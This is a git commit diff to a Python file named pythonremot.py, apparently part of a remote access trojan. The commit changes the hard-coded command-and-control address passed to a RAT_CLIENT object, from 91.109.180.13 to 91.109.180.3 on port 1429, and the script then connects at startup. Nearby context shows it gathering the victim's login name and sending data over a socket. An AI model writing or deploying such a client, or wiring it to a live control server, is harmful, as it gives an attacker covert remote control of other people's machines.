cdf6c4762db75060ecdc297ff65905cfa4942abd
alejq41 <93050806+alejq41@users.noreply.github.com>
2023-02-10 09:04:52 -0400

    Update pythonremot.py

--- pythonremot.py
+++ pythonremot.py
@@ -619,7 +619,7 @@ User: {os.getlogin()}
                 s.send(b"exit")
                 break
             
-rat = RAT_CLIENT('91.109.180.13', 1429)
+rat = RAT_CLIENT('91.109.180.3', 1429)
 
 if __name__ == '__main__':
     rat.build_connection()
